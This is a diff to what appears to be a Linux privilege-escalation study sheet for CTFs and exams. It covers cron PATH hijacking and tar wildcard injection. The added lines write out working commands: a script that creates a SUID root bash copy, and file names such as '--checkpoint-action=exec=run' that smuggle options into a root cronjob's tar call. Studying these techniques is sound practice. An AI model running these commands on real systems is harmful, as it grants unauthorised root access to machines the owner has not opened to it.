@@ -292,12 +292,33 @@ create function do_system returns integer soname 'raptor_udf2.so';
 2. PATH Environment Variable
     - Description: crontab can also specify a PATH variable that each conrjob inherits and executes commands from, if the one of the PATH (from the beginning) is writable by low priv user, we can write a script inside that directory to execute before the actual command reaches
     - Requirements: 
+      - must be a cronjob that is owned by root
+      - the cronjob must run in a reasonable time (for CTF and exam purposes)
+      - `cat /etc/crontab` must have a PATH that we have write access to, as well, and it needs to appear before the path where the actual command is supposed to live
     - Related instructions: 
+      - remember that all cronjobs will need to be executable by all, or at least the owner of the cronjob: `chmod +x /new/path/to/cronjob`
+      
 3. Wildcards
-    - Description: 
-    - Requirements: 
-    - Related instructions: 
-
+    - Description : if a cronjob uses a command that uses a wildcard `*` as one of its arguments, we can abuse the command's arguments (if it has commandline arguments that can lead to RCE or a shell
+    - Requirements : 
+      - must be a cronjob that is owned by root
+      - the cronjob must run in a reasonable time (for CTF and exam purposes)
+      - the cronjob uses a command that uses a `*` wildcard as one of its commandline arguments
+      - the command inside the cronjob can be abused by its commandline arugments for RCE
+    - Related instructions : 
+      - the command `tar` has a feature that allows users run commands as part of a checkpoint, for more info please see: [gtfoBins](https://gtfobins.github.io/)
+      - to abuse `tar`'s checkpoint RCE feature, and to abuse the cronjob using a wildcard `*` as one of its arguments, create a file with the same name as the the commandline option for `tar` that will allow RCE
+      
+      ```
+      echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' > run
+      
+      touch /home/user/--checkpoint=1
+      touch /home/user/--checkpoint-action=exec=run
+      
+      ```
+         
+          - `tar` arguments: `--checkpoint=1` : defines that there is a checkpoint before reading/archiving the first record: `1`
+          - `tar` arguments: `--checkpoint-action=exec=run` : defines the action to do at each checkpoint, which is executing run (that lives in the same directory)
 
 ### SUID/GUID
 
